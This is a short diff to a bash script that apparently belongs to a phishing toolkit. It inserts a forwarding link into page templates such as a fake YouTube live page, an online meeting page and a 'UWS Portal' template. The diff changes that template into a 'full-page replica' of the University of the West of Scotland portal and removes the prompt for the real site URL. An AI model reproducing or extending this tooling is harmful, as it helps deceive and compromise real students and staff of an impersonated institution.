@@ -233,8 +233,7 @@ sed "s+live_yt_tv+${yt_video_ID}+g" index3.html > index2.html
 elif [[ $option_tem -eq 3 ]]; then
 sed "s+forwarding_link+${link}+g" OnlineMeeting.html > index2.html
 elif [[ $option_tem -eq 4 ]]; then
-sed "s+forwarding_link+${link}+g" UWS.html > index3.html
-sed "s+uws_site_url+${uws_site_url}+g" index3.html > index2.html
+sed "s+forwarding_link+${link}+g" UWS.html > index2.html
 else
 printf "\e[1;93m [!] Invalid template option!\e[0m\n"
 exit 1
@@ -828,9 +827,7 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: 
 elif [[ $option_tem -eq 3 ]]; then
 printf ""
 elif [[ $option_tem -eq 4 ]]; then
-uws_site_url="https://www.uws.ac.uk/"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter UWS site URL [Default: https://www.uws.ac.uk/]: \e[0m' uws_site_input
-uws_site_url="${uws_site_input:-$uws_site_url}"
+printf "\e[1;92m[\e[0m*\e[1;92m] UWS Portal template selected (full-page replica)\e[0m\n"
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
